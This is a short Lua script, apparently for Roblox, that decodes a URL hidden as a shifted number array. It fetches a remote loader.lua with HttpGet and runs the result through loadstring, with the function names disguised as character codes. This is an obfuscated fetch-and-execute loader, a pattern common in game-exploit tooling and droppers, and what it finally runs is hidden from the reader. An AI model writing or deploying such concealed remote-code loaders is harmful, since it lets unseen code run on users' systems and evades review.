local encoded = {
  111,123,123,119,122,65,54,54,121,104,126,53,110,112,123,111,124,105,124,106,118,117,123,108,117,123,122,53,106,118,116,54,83,60,114,122,63,54,92,112,83,112,105,104,121,128,54,116,104,112,117,54,115,118,104,107,108,121,53,115,124,104
}
local offset = 7

local function decode(tbl, off)
  local t = {}
  for i = 1, #tbl do
    t[i] = string.char((tbl[i] - off) % 256)
  end
  return table.concat(t)
end

local url = decode(encoded, offset) .. "?t=" .. os.time()

local httpName = string.char(72,116,116,112,71,101,116)
local httpFn = game[httpName] or game.HttpGet

local ok, response = pcall(function()
  return httpFn(game, url)
end)
if not ok or not response then
  error("Failed to fetch loader script")
end

local loadName = string.char(108,111,97,100,115,116,114,105,110,103) 
local loader = _G[loadName] or load

local execOk, execErr = pcall(function()
  local fn = loader(response)
  if type(fn) == "function" then
    fn()
  end
end)
if not execOk then
  error("Failed to execute loaded script: " .. tostring(execErr))
end
